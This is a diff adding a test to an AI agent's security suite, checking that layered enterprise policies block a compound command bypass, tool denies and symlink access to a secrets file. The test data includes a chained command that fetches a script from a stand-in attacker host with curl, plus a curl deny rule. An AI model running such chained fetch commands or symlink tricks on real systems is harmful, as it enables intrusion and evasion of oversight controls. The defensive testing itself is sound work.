@@ -21,7 +21,7 @@ import { parseBingRss, parseDuckDuckGoHtml } from '../src/browser/searchProvider
 import { cleanUserText } from '../src/continuum/sanitizer.js';
 import { isPersistentServerCommand } from '../src/tools/sysRun.js';
 import { Sandbox } from '../src/sandbox.js';
-import { evaluateEnterprisePolicy } from '../src/enterprisePolicy.js';
+import { evaluateEnterprisePolicy, loadEnterprisePolicy, clearEnterprisePolicyCache } from '../src/enterprisePolicy.js';
 import { isWholeFileDeletion, requiresToolApproval } from '../src/approvalPolicy.js';
 import { isMutatingToolCall } from '../src/decisionPolicy.js';
 import { getDynamicTools } from '../src/tools/registry.js';
@@ -235,5 +235,63 @@ describe('Wave 1 Security Hardening — Path Boundary & Symlink Integrity', () =
       patch: `*** Begin Patch\n*** Update File: ${targetFile}\n@@\n-original\n+updated\n*** End Patch`
     }, { taskId: 'test-apply-patch', step: 1 });
     assert.equal(ids.length, 1);
+  });
+
+  test('enterprisePolicy enforces additive managed->user->workspace layering, compound command splitting, and symlink physical paths', () => {
+    clearEnterprisePolicyCache();
+    const managedFile = path.join(TMP, 'managed-policy.json');
+    const userHome = path.join(TMP, 'policy-home');
+    const ws = path.join(TMP, 'policy-ws');
+    fs.mkdirSync(userHome, { recursive: true });
+    fs.mkdirSync(path.join(ws, 'secrets'), { recursive: true });
+    fs.writeFileSync(path.join(ws, 'secrets', 'prod.env'), 'SECRET=1', 'utf8');
+    if (process.platform !== 'win32') {
+      fs.symlinkSync(path.join(ws, 'secrets', 'prod.env'), path.join(ws, 'benign.txt'));
+    }
+
+    // Managed tier denies curl and sets defaultEffect: ask
+    fs.writeFileSync(managedFile, JSON.stringify({
+      version: 1,
+      defaultEffect: 'ask',
+      commands: { deny: ['curl *'] },
+      paths: { deny: ['secrets/*'] }
+    }), 'utf8');
+    // Workspace tries to weaken managed tier with allow + defaultEffect: allow (must NOT erase managed rules)
+    fs.writeFileSync(path.join(ws, 'causyne.policy.json'), JSON.stringify({
+      version: 1,
+      defaultEffect: 'allow',
+      commands: { allow: ['curl *'] },
+      tools: { deny: ['computer_use'] }
+    }), 'utf8');
+
+    const env = { CAUSYNE_MANAGED_POLICY_FILE: managedFile, CAUSYNE_HOME: userHome };
+    const loaded = loadEnterprisePolicy(ws, env);
+    assert.equal(loaded.found, true);
+    assert.equal(loaded.policy?.defaultEffect, 'ask');
+    assert.equal(loaded.sourcePaths?.length, 2);
+
+    // Compound command bypass attempt blocked by segment splitting
+    const compound = evaluateEnterprisePolicy({
+      tool: 'sysRun',
+      args: { command: 'echo ok && curl https://evil.example/a.sh' },
+      workspaceRoot: ws,
+      env
+    }, loaded);
+    assert.equal(compound.effect, 'deny');
+
+    // Workspace-level deny also merges cleanly
+    const wsDeny = evaluateEnterprisePolicy({ tool: 'computer_use', args: {}, workspaceRoot: ws, env }, loaded);
+    assert.equal(wsDeny.effect, 'deny');
+
+    // Symlink physical path caught by secrets/* deny rule
+    if (process.platform !== 'win32') {
+      const symEval = evaluateEnterprisePolicy({
+        tool: 'fs_read',
+        args: { path: path.join(ws, 'benign.txt') },
+        workspaceRoot: ws,
+        env
+      }, loaded);
+      assert.equal(symEval.effect, 'deny');
+    }
   });
 });
